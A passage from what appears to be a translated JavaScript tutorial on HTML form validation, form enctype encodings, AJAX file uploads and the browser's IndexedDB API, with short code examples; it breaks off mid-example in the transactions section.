The form input box above requires that only lowercase letters can be entered and that no more than 15 characters are allowed. If the input does not meet the requirement (for example, entering "ABC"), when the form is submitted, Chrome pops up the error message "Please match the requested format." and prohibits form submission. Below, the `setCustomValidity()` method is used to replace the error message.

```js
var input = document.getElementById('username');
input.oninvalid = function (event) {
  event.target.setCustomValidity(
    'The username must be lowercase letters, cannot be empty, and must not exceed 15 characters'
  );
}
```

In the code above, the `setCustomValidity()` method is called inside the listener function of the `invalid` event. This method can also be called directly, in which case if the argument is not an empty string, the browser considers that the control did not pass validation and immediately displays the error message set by this method.

```js
/* HTML code as follows
<form>
  <p><input type="file" id="fs"></p>
  <p><input type="submit"></p>
</form>
*/

document.getElementById('fs').onchange = checkFileSize;

function checkFileSize() {
  var fs = document.getElementById('fs');
  var files = fs.files;
  if (files.length > 0) {
     if (files[0].size > 75 * 1024) {
       fs.setCustomValidity('The file cannot be larger than 75KB');
       return;
     }
  }
  fs.setCustomValidity('');
}
```

In the code above, once it is found that the file is larger than 75KB, validation is set to fail and a custom error message is given. Then, when the submit button is clicked, the error message is displayed. This kind of validation failure is not automatically cleared, so if all files meet the conditions, you must set the error message to an empty string to manually clear the validation-failure state.



#### 3.6 The validity property

The `validity` property of a control element returns a `ValidityState` object containing information about the current validation state.

This object has the following properties, all of which are read-only.

- `ValidityState.badInput`: a boolean value indicating whether the browser is unable to convert the user's input into the correct type, for example when the user enters a string into a numeric box.
- `ValidityState.customError`: a boolean value indicating whether the `setCustomValidity()` method has been called to set the validation message to a non-empty string.
- `ValidityState.patternMismatch`: a boolean value indicating whether the value entered by the user does not meet the pattern requirement.
- `ValidityState.rangeOverflow`: a boolean value indicating whether the value entered by the user is greater than the maximum range.
- `ValidityState.rangeUnderflow`: a boolean value indicating whether the value entered by the user is less than the minimum range.
- `ValidityState.stepMismatch`: a boolean value indicating that the value entered by the user does not conform to the step setting (that is, it is not divisible by the step value).
- `ValidityState.tooLong`: a boolean value indicating that the number of characters entered by the user exceeds the maximum.
- `ValidityState.tooShort`: a boolean value indicating that the user entered fewer characters than the minimum.
- `ValidityState.typeMismatch`: a boolean value indicating that the value the user filled in does not meet the type requirement (mainly for the Email or URL type cases).
- `ValidityState.valid`: a boolean value indicating whether the user meets all validation conditions.
- `ValidityState.valueMissing`: a boolean value indicating that the user did not fill in a required value.

Below is an example.

```js
var input = document.getElementById('myinput');
if (input.validity.valid) {
  console.log('Validation passed');
} else {
  console.log('Validation failed');
}
```

Below is another example.

```js
var txt = '';
if (document.getElementById('myInput').validity.rangeOverflow) {
  txt = 'The value exceeds the upper limit';
}
document.getElementById('prompt').innerHTML = txt;
```

If you want to prevent the browser from popping up the form validation error message, you can listen for the `invalid` event.

```js
var input = document.getElementById('username');
var form  = document.getElementById('form');

var elem = document.createElement('div');
elem.id  = 'notify';
elem.style.display = 'none';
form.appendChild(elem);

input.addEventListener('invalid', function (event) {
  event.preventDefault();
  if (!event.target.validity.valid) {
    elem.textContent   = 'The username must be lowercase letters';
    elem.className     = 'error';
    elem.style.display = 'block';
    input.className    = 'invalid animated shake';
  }
});

input.addEventListener('input', function(event){
  if ( 'block' === elem.style.display ) {
    input.className = '';
    elem.style.display = 'none';
  }
});
```

In the code above, once the `invalid` event occurs (form validation fails), `event.preventDefault()` is used to prevent the browser from popping up the default validation-failure prompt, and then a custom error prompt box is set.



#### 3.7 The form's novalidate attribute

The HTML attribute `novalidate` of a form element can turn off the browser's automatic validation.

```html
<form novalidate>
</form>
```

This attribute can also be set in a script.

```js
form.noValidate = true;
```

If the form element does not have the `novalidate` attribute set, then the `formnovalidate` attribute of the submit button (an `<input>` or `<button>` element) has the same effect.

```html
<form>
  <input type="submit" value="submit" formnovalidate>
</form>
```



### 4. The enctype attribute

A form can use four encodings to send data to the server. The encoding format is determined by the form's `enctype` attribute.

Assume the form has two fields, `foo` and `baz`, where the value of the `foo` field equals `bar`, and the value of the `baz` field is a string split into two lines.

```
The first line.
The second line.
```

The following four formats can all send this form to the server.

**(1) The GET method**

If the form uses the `GET` method to send data, the `enctype` attribute has no effect.

```html
<form
  action="register.php"
  method="get"
  onsubmit="AJAXSubmit(this); return false;"
>
</form>
```

The data is sent as the URL's query string.

```
?foo=bar&baz=The%20first%20line.%0AThe%20second%20line.
```

**(2) application/x-www-form-urlencoded**

If the form uses the `POST` method to send data and omits the `enctype` attribute, then the data is sent in `application/x-www-form-urlencoded` format (because this is the default value).

```html
<form
  action="register.php"
  method="post"
  onsubmit="AJAXSubmit(this); return false;"
>
</form>
```

The HTTP request sent is as follows.

```http
Content-Type: application/x-www-form-urlencoded

foo=bar&baz=The+first+line.%0D%0AThe+second+line.%0D%0A
```

In the code above, the `%0D%0A` in the data body represents a line break (`\r\n`).

**(3) text/plain**

If the form uses the `POST` method to send data and the `enctype` attribute is `text/plain`, then the data is sent in plain text format.

```html
<form
  action="register.php"
  method="post"
  enctype="text/plain"
  onsubmit="AJAXSubmit(this); return false;"
>
</form>
```

The HTTP request sent is as follows.

```http
Content-Type: text/plain

foo=bar
baz=The first line.
The second line.
```

**(4) multipart/form-data**

If the form uses the `POST` method and the `enctype` attribute is `multipart/form-data`, then the data is sent in a mixed format.

```html
<form
  action="register.php"
  method="post"
  enctype="multipart/form-data"
  onsubmit="AJAXSubmit(this); return false;"
>
</form>
```

The HTTP request sent is as follows.

```http
Content-Type: multipart/form-data; boundary=---------------------------314911788813839

-----------------------------314911788813839
Content-Disposition: form-data; name="foo"

bar
-----------------------------314911788813839
Content-Disposition: form-data; name="baz"

The first line.
The second line.

-----------------------------314911788813839--
```

This format is also the format for file uploads.



### 5. File upload

Users also upload files through forms. Specifically, a local file is selected via a file input box, and when the form is submitted, the browser sends this file to the server.

```html
<input type="file" id="file" name="myFile">
```

In addition, you need to set the ` <form> ` element's `method` attribute to `POST` and its `enctype` attribute to `multipart/form-data`. The `enctype` attribute determines the value of the HTTP header's `Content-Type` field; by default this field's value is `application/x-www-form-urlencoded`, but for file uploads it must be changed to `multipart/form-data`.

```html
<form method="post" enctype="multipart/form-data">
  <div>
    <label for="file">Choose a file</label>
    <input type="file" id="file" name="myFile" multiple>
  </div>
  <div>
    <input type="submit" id="submit" name="submit_button" value="Upload" />
  </div>
</form>
```

In the HTML code above, the file control's `multiple` attribute specifies that multiple files can be selected at once; without this attribute, only one file can be selected at a time.

```js
var fileSelect = document.getElementById('file');
var files = fileSelect.files;
```

Then, create a FormData instance object to simulate the form data sent to the server, and add the selected files to this object.

```js
var formData = new FormData();

for (var i = 0; i < files.length; i++) {
  var file = files[i];

  // only upload image files
  if (!file.type.match('image.*')) {
    continue;
  }

  formData.append('photos[]', file, file.name);
}
```

Finally, use AJAX to upload the files to the server.

```js
var xhr = new XMLHttpRequest();

xhr.open('POST', 'handler.php', true);

xhr.onload = function () {
  if (xhr.status !== 200) {
    console.log('An error occurred!');
  }
};

xhr.send(formData);
```

Besides sending a FormData instance, you can also send a file directly via AJAX.

```js
var file = document.getElementById('test-input').files[0];
var xhr = new XMLHttpRequest();

xhr.open('POST', 'myserver/uploads');
xhr.setRequestHeader('Content-Type', file.type);
xhr.send(file);
```



## 14. IndexedDB API

### 1. Overview

As browser features continue to grow stronger, more and more sites are starting to consider storing large amounts of data on the client side, which can reduce fetching data from the server and obtain data directly from local storage.

The existing browser data storage solutions are all unsuitable for storing large amounts of data: cookies cannot exceed 4KB in size and are sent back to the server on every request; LocalStorage is between 2.5MB and 10MB (varying by browser), does not provide search functionality, and cannot create custom indexes. Therefore, a new solution is needed, which is the background against which IndexedDB was born.

In plain terms, IndexedDB is a local database provided by the browser that can be created and operated by web page scripts. IndexedDB allows storing large amounts of data, provides a lookup interface, and can also create indexes. None of these are features that LocalStorage has. In terms of database type, IndexedDB is not a relational database (it does not support SQL query statements) and is closer to a NoSQL database.

IndexedDB has the following characteristics.

**(1) Key-value storage.** IndexedDB internally uses object stores to hold data. All types of data can be stored directly, including JavaScript objects. In an object store, data is saved in the form of "key-value pairs," and each data record has a corresponding primary key; the primary key is unique and cannot be duplicated, otherwise an error is thrown.

**(2) Asynchronous.** IndexedDB operations do not lock the browser, and the user can still perform other operations, in contrast to LocalStorage, whose operations are synchronous. The asynchronous design is to prevent the reading and writing of large amounts of data from slowing down the page's performance.

**(3) Supports transactions.** IndexedDB supports transactions, which means that in a series of operation steps, as long as one step fails, the entire transaction is canceled and the database rolls back to the state before the transaction occurred, with no situation where only part of the data is modified.

**(4) Same-origin restriction.** IndexedDB is subject to the same-origin restriction; each database corresponds to the domain that created it. A page can only access databases under its own domain and cannot access cross-origin databases.

**(5) Large storage space.** IndexedDB's storage space is much larger than LocalStorage's, generally no less than 250MB, and possibly with no upper limit.

**(6) Supports binary storage.** IndexedDB can store not only strings but also binary data (ArrayBuffer objects and Blob objects).



### 2. Basic concepts

IndexedDB is a relatively complex API involving quite a few concepts. It abstracts different entities into individual object interfaces. Learning this API is learning its various object interfaces.

- Database: the IDBDatabase object
- Object store: the IDBObjectStore object
- Index: the IDBIndex object
- Transaction: the IDBTransaction object
- Operation request: the IDBRequest object
- Cursor: the IDBCursor object
- Primary key set: the IDBKeyRange object

Below are some of the main concepts.

**(1) Database**

A database is a container for a series of related data. Each domain (strictly speaking, protocol + domain + port) can create any number of databases.

IndexedDB databases have the concept of versions. At any given moment, only one version of a database can exist. To modify the database structure (adding or deleting tables, indexes, or primary keys), this can only be done by upgrading the database version.

**(2) Object store**

Each database contains several object stores. An object store is similar to a table in a relational database.

**(3) Data record**

An object store holds data records. Each record is similar to a row in a relational database, but has only two parts: the primary key and the data body. The primary key is used to create the default index and must be distinct, otherwise an error is thrown. The primary key can be a property within the data record, or it can be specified as an incrementing integer number.

```js
{ id: 1, text: 'foo' }
```

In the object above, the `id` property can serve as the primary key.

The data body can be any data type, not limited to objects.

**(4) Index**

To speed up data retrieval, you can create indexes for different properties within an object store.

**(5) Transaction**

Reading, writing, deleting, and modifying data records must all be done through a transaction. The transaction object provides three events, `error`, `abort`, and `complete`, used to listen for the operation result.



### 3. Operation flow

The various operations on an IndexedDB database are generally carried out according to the flow below. This section only gives simple code examples for quick getting started; the detailed API of each object is introduced later.



#### 3.1 Opening the database

The first step in using IndexedDB is to open the database, using the `indexedDB.open()` method.

```js
var request = window.indexedDB.open(databaseName, version);
```

This method accepts two arguments. The first argument is a string representing the name of the database. If the specified database does not exist, a new database is created. The second argument is an integer representing the version of the database. If omitted, when opening an existing database it defaults to the current version, and when creating a new database it defaults to `1`.

The `indexedDB.open()` method returns an IDBRequest object. This object handles the result of the open-database operation through three events: `error`, `success`, and `upgradeneeded`.

**(1) The error event**

The `error` event indicates that opening the database failed.

```js
request.onerror = function (event) {
  console.log('Error opening the database');
};
```

**(2) The success event**

The `success` event indicates that the database was opened successfully.

```js
var db;

request.onsuccess = function (event) {
  db = request.result;
  console.log('Database opened successfully');
};
```

At this point, the database object is obtained via the `result` property of the `request` object.

**(3) The upgradeneeded event**

If the specified version number is greater than the database's actual version number, the database upgrade event `upgradeneeded` occurs.

```js
var db;

request.onupgradeneeded = function (event) {
  db = event.target.result;
}
```

At this point, the database instance is obtained via the event object's `target.result` property.



#### 3.2 Creating a database

Creating a database and opening a database are the same operation. If the specified database does not exist, it is created. The difference is that the subsequent operations are mainly completed inside the listener function of the `upgradeneeded` event, because at this point the version goes from nonexistent to existing, so this event is triggered.

Usually, after creating a database, the first thing to do is create an object store (that is, create a table).

```js
request.onupgradeneeded = function(event) {
  db = event.target.result;
  var objectStore = db.createObjectStore('person', { keyPath: 'id' });
}
```

In the code above, after the database is successfully created, a table called `person` is added, with the primary key being `id`.

A better approach is to first check whether this table exists, and only create it if it does not.

```js
request.onupgradeneeded = function (event) {
  db = event.target.result;
  var objectStore;
  if (!db.objectStoreNames.contains('person')) {
    objectStore = db.createObjectStore('person', { keyPath: 'id' });
  }
}
```

The primary key (key) is the property for which an index is created by default. For example, if the data record is `{ id: 1, name: 'John' }`, then the `id` property can serve as the primary key. The primary key can also be specified as a property of a nested object; for example, the `foo.bar` of `{ foo: { bar: 'baz' } }` can also be specified as the primary key.

If there is no property in the data record suitable to serve as the primary key, then you can let IndexedDB automatically generate the primary key.

```js
var objectStore = db.createObjectStore(
  'person',
  { autoIncrement: true }
);
```

In the code above, the primary key is specified as an incrementing integer.

After creating an object store, the next step can be to create indexes.

```js
request.onupgradeneeded = function(event) {
  db = event.target.result;
  var objectStore = db.createObjectStore('person', { keyPath: 'id' });
  objectStore.createIndex('name', 'name', { unique: false });
  objectStore.createIndex('email', 'email', { unique: true });
}
```

In the code above, the three arguments of `IDBObject.createIndex()` are the index name, the property the index is on, and a configuration object (describing whether the property contains duplicate values).



#### 3.3 Adding data

Adding data means writing a data record into an object store. This needs to be done through a transaction.

```js
function add() {
  var request = db.transaction(['person'], 'readwrite')
    .objectStore('person')
    .add({ id: 1, name: 'John', age: 24, email: 'john@example.com' });

  request.onsuccess = function (event) {
    console.log('Data written successfully');
  };

  request.onerror = function (event) {
    console.log('Failed to write data');
  }
}

add();
```

In the code above, writing data requires creating a new transaction. When creating it, you must specify the table name and the operation mode ("read-only" or "read-write"). After creating the transaction, the IDBObjectStore object is obtained via the `IDBTransaction.objectStore(name)` method, and then a record is written into the table via the table object's `add()` method.

The write operation is an asynchronous operation; by listening for the `success` event and `error` event of the connection object, you can learn whether the write succeeded.



#### 3.4 Reading data

Reading data is also done through a transaction.

```js
function read() {
   var transaction = db.transaction(['person']);
   var objectStore = transaction.objectStore('person');
   var request = objectStore.get(1);

   request.onerror = function(event) {
     console.log('Transaction failed');
   };

   request.onsuccess = function( event) {
      if (request.result) {
        console.log('Name: ' + request.result.name);
        console.log('Age: ' + request.result.age);
        console.log('Email: ' + request.result.email);
      } else {
        console.log('No data record obtained');
      }
   };
}

read();
```

In the code above, the `objectStore.get()` method is used to read data, with the argument being the value of the primary key.



#### 3.5 Iterating over data

To iterate over all records in a data table, you use the cursor object IDBCursor.

```js
function readAll() {
  var objectStore = db.transaction('person').objectStore('person');

   objectStore.openCursor().onsuccess = function (event) {
     var cursor = event.target.result;

     if (cursor) {
       console.log('Id: ' + cursor.key);
       console.log('Name: ' + cursor.value.name);
       console.log('Age: ' + cursor.value.age);
       console.log('Email: ' + cursor.value.email);
       cursor.continue();
    } else {
      console.log('No more data!');
    }
  };
}

readAll();
```

In the code above, the `openCursor()` method that creates the cursor object is an asynchronous operation, so you need to listen for the `success` event.



#### 3.6 Updating data

To update data, use the `IDBObject.put()` method.

```js
function update() {
  var request = db.transaction(['person'], 'readwrite')
    .objectStore('person')
    .put({ id: 1, name: 'Mary', age: 35, email: 'mary@example.com' });

  request.onsuccess = function (event) {
    console.log('Data updated successfully');
  };

  request.onerror = function (event) {
    console.log('Failed to update data');
  }
}

update();
```

In the code above, the `put()` method automatically updates the record with primary key `1`.



#### 3.7 Deleting data

The `IDBObjectStore.delete()` method is used to delete a record.

```js
function remove() {
  var request = db.transaction(['person'], 'readwrite')
    .objectStore('person')
    .delete(1);

  request.onsuccess = function (event) {
    console.log('Data deleted successfully');
  };
}

remove();
```



#### 3.8 Using indexes

The significance of an index is that it lets you search any field, that is, obtain a data record from any field. If no index is created, by default you can only search by the primary key (that is, retrieve values by the primary key).

Assume that when creating the table, an index was created on the `name` field.

```js
objectStore.createIndex('name', 'name', { unique: false });
```

Now you can find the corresponding data record from `name`.

  }

### 4. The indexedDB object

The browser natively provides the `indexedDB` object as the developer's operation interface.

#### 4.1 indexedDB.open()

The `indexedDB.open()` method is used to open a database. This is an asynchronous operation, but it immediately returns an IDBOpenDBRequest object.

```js
var openRequest = window.indexedDB.open('test', 1);
```

The code above opens a database named `test` with version `1`. If this database does not exist, it is created.

The first argument of the `open()` method is the database name, in string format, and cannot be omitted; the second argument is the database version, which is a positive integer greater than `0` (`0` will throw an error), and if this argument is greater than the current version, a database upgrade is triggered. The second argument can be omitted; if the database already exists, the current version of the database is opened; if the database does not exist, a database of that version is created, defaulting to version `1`.

Opening a database is an asynchronous operation, and the client is notified through various events. Below are the 4 events that may be triggered.

- **success**: opened successfully.
- **error**: opening failed.
- **upgradeneeded**: this database is being opened for the first time, or the database version has changed.
- **blocked**: the previous database connection has not yet been closed.

When opening the database for the first time, the `upgradeneeded` event is triggered first, and then the `success` event.

Add listener functions for the 4 events above according to your different needs.

```js
var openRequest = indexedDB.open('test', 1);
var db;

openRequest.onupgradeneeded = function (e) {
  console.log('Upgrading...');
}

openRequest.onsuccess = function (e) {
  console.log('Success!');
  db = openRequest.result;
}

openRequest.onerror = function (e) {
  console.log('Error');
  console.log(e);
}
```

There are two things to note about the code above. First, the `open()` method returns an object (IDBOpenDBRequest), and the listener functions are defined on this object. Second, after the `success` event occurs, the already-opened `IndexedDB` database object can be obtained from the `openRequest.result` property.



#### 4.2 indexedDB.deleteDatabase()

The `indexedDB.deleteDatabase()` method is used to delete a database, with the argument being the database name. It immediately returns an `IDBOpenDBRequest` object and then performs an asynchronous deletion of the database. The result of the delete operation is notified through events, and the `IDBOpenDBRequest` object can listen for the following events.

- `success`: deleted successfully
- `error`: deletion error

```js
var DBDeleteRequest = window.indexedDB.deleteDatabase('demo');

DBDeleteRequest.onerror = function (event) {
  console.log('Error');
};

DBDeleteRequest.onsuccess = function (event) {
  console.log('success');
};
```

After calling the `deleteDatabase()` method, all other already-opened connections to the current database receive the `versionchange` event.

Note that deleting a nonexistent database does not throw an error.



#### 4.3 indexedDB.cmp()

The `indexedDB.cmp()` method compares whether two values are the same indexedDB primary key. It returns an integer representing the comparison result: `0` means they are the same, `1` means the first primary key is greater than the second, and `-1` means the first primary key is less than the second.

```js
window.indexedDB.cmp(1, 2) // -1
```

Note that this method cannot be used to compare arbitrary JavaScript values. If the arguments are booleans or objects, it throws an error.

```js
window.indexedDB.cmp(1, true) // throws an error
window.indexedDB.cmp({}, {}) // throws an error
```



### 5. The IDBRequest object

The IDBRequest object represents an opened database connection, and the `indexedDB.open()` method and the `indexedDB.deleteDatabase()` method return this object. Database operations are all completed through this object.

All operations on this object are asynchronous; you need to determine whether they are complete via the `readyState` property: if it is `pending`, the operation is in progress, and if it is `done`, the operation is complete, which may be a success or a failure.

After the operation completes, the `success` event or `error` event is triggered, at which point you can obtain the operation result via the `result` property and the `error` property. If you read these two properties during the `pending` stage, an error is thrown.

The IDBRequest object has the following properties.

- `IDBRequest.readyState`: equal to `pending` means the operation is in progress, and equal to `done` means the operation is completing.
- `IDBRequest.result`: returns the result of the request. If the request failed or the result is unavailable, reading this property throws an error.
- `IDBRequest.error`: returns the error object when the request fails.
- `IDBRequest.source`: returns the source of the request (such as an index object or ObjectStore).
- `IDBRequest.transaction`: returns the transaction the current request is being conducted in, or `null` if no transaction is involved.
- `IDBRequest.onsuccess`: specifies the listener function for the `success` event.
- `IDBRequest.onerror`: specifies the listener function for the `error` event.

The IDBOpenDBRequest object inherits from the IDBRequest object and provides two additional event listener properties.

- `IDBOpenDBRequest.onblocked`: specifies the listener function for the `blocked` event (when the `upgradeneeded` event is triggered while the database is still in use).
- `IDBOpenDBRequest.onupgradeneeded`: the listener function for the `upgradeneeded` event.



### 6. The IDBDatabase object

After successfully opening the database, you can obtain an `IDBDatabase` object from the `result` property of the `IDBOpenDBRequest` object, which represents the connected database. Subsequent operations on the database are all completed through this object.

```js
var db;
var DBOpenRequest = window.indexedDB.open('demo', 1);

DBOpenRequest.onerror = function (event) {
  console.log('Error');
};

DBOpenRequest.onsuccess = function(event) {
  db = DBOpenRequest.result;
  // ...
};
```

#### 6.1 Properties

The IDBDatabase object has the following properties.

- `IDBDatabase.name`: a string, the database name.
- `IDBDatabase.version`: an integer, the database version. When the database is first created, this property is an empty string.
- `IDBDatabase.objectStoreNames`: a DOMStringList object (a collection of strings) containing the names of all object stores of the current database.
- `IDBDatabase.onabort`: specifies the listener function for the abort event (transaction aborted).
- `IDBDatabase.onclose`: specifies the listener function for the close event (the database is unexpectedly closed).
- `IDBDatabase.onerror`: specifies the listener function for the error event (failed to access the database).
- `IDBDatabase.onversionchange`: triggered when the database version changes (the `upgradeneeded` event occurs, or `indexedDB.deleteDatabase()` is called).

Below is an example of the `objectStoreNames` property. This property returns a DOMStringList object containing the names of all object stores (that is, table names) of the current database, and you can use the `contains` method of the DOMStringList object to check whether the database contains a certain object store.

```js
if (!db.objectStoreNames.contains('firstOS')) {
  db.createObjectStore('firstOS');
}
```

The code above first checks whether a certain object store exists, and creates it if it does not.



#### 6.2 Methods

The IDBDatabase object has the following methods.

- `IDBDatabase.close()`: closes the database connection; in practice it waits until all transactions are complete before closing.
- `IDBDatabase.createObjectStore()`: creates an object store for holding data, similar to a table in a traditional relational database, and returns an IDBObjectStore object. This method can only be called inside a `versionchange` event listener function.
- `IDBDatabase.deleteObjectStore()`: deletes the specified object store. This method can only be called inside a `versionchange` event listener function.
- `IDBDatabase.transaction()`: returns an IDBTransaction transaction object.

Below is an example of the `createObjectStore()` method.

```js
var request = window.indexedDB.open('demo', 2);

request.onupgradeneeded = function (event) {
  var db = event.target.result;

  db.onerror = function(event) {
    console.log('error');
  };

  var objectStore = db.createObjectStore('items');

  // ...
};
```

The code above creates an object store named `items`; if this object store already exists, an error is thrown. To avoid errors, you need to use the `objectStoreNames` property described below to check which object stores already exist.

The `createObjectStore()` method can also accept a second object argument, used to set the properties of the object store.

```js
db.createObjectStore('test', { keyPath: 'email' });
db.createObjectStore('test2', { autoIncrement: true });
```

In the code above, the `keyPath` property represents the primary key (since primary key values cannot be duplicated, in the example above, before storing, you must ensure that the `email` property values of the data are all different), defaulting to `null`; the `autoIncrement` property indicates whether to use an auto-incrementing integer as the primary key (the first data record is 1, the second data record is 2, and so on), defaulting to `false`. Generally speaking, using just one of the `keyPath` and `autoIncrement` properties is sufficient; if both are used at the same time, it means the primary key is an incrementing integer and the object must not lack the property specified by `keyPath`.

Below is an example of the `deleteObjectStore()` method.

```js
var dbName = 'sampleDB';
var dbVersion = 2;
var request = indexedDB.open(dbName, dbVersion);

request.onupgradeneeded = function(e) {
  var db = request.result;
  if (e.oldVersion < 1) {
    db.createObjectStore('store1');
  }

  if (e.oldVersion < 2) {
    db.deleteObjectStore('store1');
    db.createObjectStore('store2');
  }

  // ...
};
```

Below is an example of the `transaction()` method, which is used to create a database transaction and returns an IDBTransaction object. Before adding data to the database, you must first create a database transaction.

```js
var t = db.transaction(['items'], 'readwrite');
```

The `transaction()` method accepts two arguments: the first argument is an array containing the object stores involved, usually just one; the second argument is a string representing the operation type. Currently, there are only two operation types: `readonly` (read-only) and `readwrite` (read-write). Use `readwrite` for adding data and `readonly` for reading data. The second argument is optional and defaults to `readonly` mode when omitted.



### 7. The IDBObjectStore object

The IDBObjectStore object corresponds to an object store. What the `IDBDatabase.createObjectStore()` method returns is an IDBObjectStore object.

The `transaction()` of the IDBDatabase object returns a transaction object, whose `objectStore()` method returns an IDBObjectStore object, so you can use the following chained form.

```js
db.transaction(['test'], 'readonly')
  .objectStore('test')
  .get(X)
  .onsuccess = function (e) {}
```



#### 7.1 Properties

The IDBObjectStore object has the following properties.

- `IDBObjectStore.indexNames`: returns an array-like object (DOMStringList) containing all indexes of the current object store.
- `IDBObjectStore.keyPath`: returns the primary key of the current object store.
- `IDBObjectStore.name`: returns the name of the current object store.
- `IDBObjectStore.transaction`: returns the transaction object the current object store belongs to.
- `IDBObjectStore.autoIncrement`: a boolean value indicating whether the primary key auto-increments.



#### 7.2 Methods

The IDBObjectStore object has the following methods.

**(1) IDBObjectStore.add()**

`IDBObjectStore.add()` is used to add data to an object store and returns an IDBRequest object. This method is only used to add data; if the primary key is the same it throws an error, so updating data must use the `put()` method.

```js
objectStore.add(value, key)
```

This method accepts two arguments: the first argument is the value, and the second argument is the primary key, which is optional and defaults to `null` if omitted.

After creating a transaction, you can obtain the object store and then use the `add()` method to add data to it.

```js
var db;
var DBOpenRequest = window.indexedDB.open('demo', 1);

DBOpenRequest.onsuccess = function (event) {
  db = DBOpenRequest.result;
  var transaction = db.transaction(['items'], 'readwrite');

  transaction.oncomplete = function (event) {
    console.log('transaction success');
  };

  transaction.onerror = function (event) {
    console.log('transaction error: ' + transaction.error);
  };

  var objectStore = transaction.objectStore('items');
  var objectStoreRequest = objectStore.add({ foo: 1 });

  objectStoreRequest.onsuccess = function (event) {
    console.log('add data success');
  };

};
```

**(2) IDBObjectStore.put()**

The `IDBObjectStore.put()` method is used to update the data record corresponding to a certain primary key; if the corresponding key value does not exist, a new record is inserted. This method returns an IDBRequest object.

```js
objectStore.put(item, key)
```

This method accepts two arguments: the first argument is the new data, and the second argument is the primary key, which is optional and only necessary to provide when auto-incrementing, because in that case the primary key is not included in the data value.

**(3) IDBObjectStore.clear()**

`IDBObjectStore.clear()` deletes all records of the current object store. This method returns an IDBRequest object.

```js
objectStore.clear()
```

This method takes no arguments.

**(4) IDBObjectStore.delete()**

The `IDBObjectStore.delete()` method is used to delete the record with the specified primary key. This method returns an IDBRequest object.

```js
objectStore.delete(Key)
```

The argument of this method is the value of the primary key.

**(5) IDBObjectStore.count()**

The `IDBObjectStore.count()` method is used to count the number of records. This method returns an IDBRequest object.

```js
IDBObjectStore.count(key)
```

When called without arguments, this method returns the total number of records in the current object store. If a primary key or IDBKeyRange object is passed as an argument, it returns the corresponding number of records.

**(6) IDBObjectStore.getKey()**

`IDBObjectStore.getKey()` is used to obtain a primary key. This method returns an IDBRequest object.

```js
objectStore.getKey(key)
```

The argument of this method can be a primary key value or an IDBKeyRange object.

**(7) IDBObjectStore.get()**

`IDBObjectStore.get()` is used to obtain the data record corresponding to a primary key. This method returns an IDBRequest object.

```js
objectStore.get(key)
```

**(8) IDBObjectStore.getAll()**

`DBObjectStore.getAll()` is used to obtain the records of an object store. This method returns an IDBRequest object.

```js
// get all records
objectStore.getAll()

// get all records matching the specified primary key or IDBKeyRange
objectStore.getAll(query)

// specify the number of records to get
objectStore.getAll(query, count)
```

**(9) IDBObjectStore.getAllKeys()**

`IDBObjectStore.getAllKeys()` is used to obtain all primary keys matching the conditions. This method returns an IDBRequest object.

```js
// get the primary keys of all records
objectStore.getAllKeys()

// get all primary keys matching the conditions
objectStore.getAllKeys(query)

// specify the number of primary keys to get
objectStore.getAllKeys(query, count)
```

**(10) IDBObjectStore.index()**

The `IDBObjectStore.index()` method returns the index object IDBIndex with the specified name.

```js
objectStore.index(name)
```

Once you have an index, you can read data based on the property the index is on.

```js
var t = db.transaction(['people'], 'readonly');
var store = t.objectStore('people');
var index = store.index('name');

var request = index.get('foo');
```

In the code above, after opening the object store, the `index()` method is first used to specify obtaining the index of the `name` property, and then the `get()` method is used to read the data corresponding to a certain `name` property (`foo`). If the `name` property does not correspond to a unique value, then the `get()` method may retrieve multiple data objects. In addition, `get()` is an asynchronous method, and after a successful read, the data can only be processed in the listener function of the `success` event.

**(11) IDBObjectStore.createIndex()**

The `IDBObjectStore.createIndex()` method is used to create an index of the current database. This method can only be called inside a `VersionChange` listener function.

```js
objectStore.createIndex(indexName, keyPath, objectParameters)
```

This method can accept three arguments.

- indexName: the index name
- keyPath: the primary key
- objectParameters: the configuration object (optional)

The third argument can configure the following properties.

- unique: if set to `true`, duplicate values are not allowed
- multiEntry: if set to `true`, for a primary key array with multiple values, each value creates a new entry in the index; otherwise the primary key array corresponds to a single entry.

Assume the data records in the object store are all of the following `person` type.

```js
var person = {
  name: name,
  email: email,
  created: new Date()
};
```

You can specify a certain property of this object to create an index.

```js
var store = db.createObjectStore('people', { autoIncrement: true });

store.createIndex('name', 'name', { unique: false });
store.createIndex('email', 'email', { unique: true });
```

The code above tells the index object that the `name` property is not a unique value and the `email` property is a unique value.

**(12) IDBObjectStore.deleteIndex()**

The `IDBObjectStore.deleteIndex()` method is used to delete the specified index. This method can only be called inside a `VersionChange` listener function.

```js
objectStore.deleteIndex(indexName)
```

**(13) IDBObjectStore.openCursor()**

`IDBObjectStore.openCursor()` is used to obtain a cursor object.

```js
IDBObjectStore.openCursor()
```

The cursor object can be used to iterate over data. This object is also asynchronous and has its own `success` and `error` events, for which you can specify listener functions.

```js
var t = db.transaction(['test'], 'readonly');
var store = t.objectStore('test');

var cursor = store.openCursor();

cursor.onsuccess = function (event) {
  var res = event.target.result;
  if (res) {
    console.log('Key', res.key);
    console.dir('Data', res.value);
    res.continue();
  }
}
```

The listener function accepts an event object as an argument, whose `target.result` property points to the current data record. The record's `key` and `value` return the primary key and the value (that is, the actual stored data) respectively. The `continue()` method moves the cursor to the next data object; if the current data object is already the last one, the cursor points to `null`.

The first argument of the `openCursor()` method is a primary key value or an IDBKeyRange object. If this argument is specified, only records containing the specified primary key are processed; if omitted, all records are processed. This method can also accept a second argument representing the iteration direction, defaulting to `next`, with other possible values being `prev`, `nextunique`, and `prevunique`. The latter two values mean that if a duplicate value is encountered, it is automatically skipped.

**(14) IDBObjectStore.openKeyCursor()**

`IDBObjectStore.openKeyCursor()` is used to obtain a primary-key cursor object.

```js
IDBObjectStore.openKeyCursor()
```



### 8. The IDBTransaction object

The IDBTransaction object is used to asynchronously operate on database transactions; all read and write operations must be conducted through this object.

What the `IDBDatabase.transaction()` method returns is an IDBTransaction object.

```js
var db;
var DBOpenRequest = window.indexedDB.open('demo', 1);

DBOpenRequest.onsuccess = function(event) {
  db = DBOpenRequest.result;
  var transaction = db.transaction(['demo'], 'readwrite');

  transaction.oncomplete = function (event) {
    console.log('transaction success');
  };

  transaction.onerror = function (event) {
    console.log('transaction error: ' + transaction.error);
  };

  var objectStore = transaction.objectStore('demo');
  var objectStoreRequest = objectStore.add({ foo: 1 });

  objectStoreRequest.onsuccess = function (event) {
    console.log('add data success');
  };

};
```

The execution order of transactions follows the order of creation, not the order in which requests are made.

```js
var trans1 = db.transaction('foo', 'readwrite');
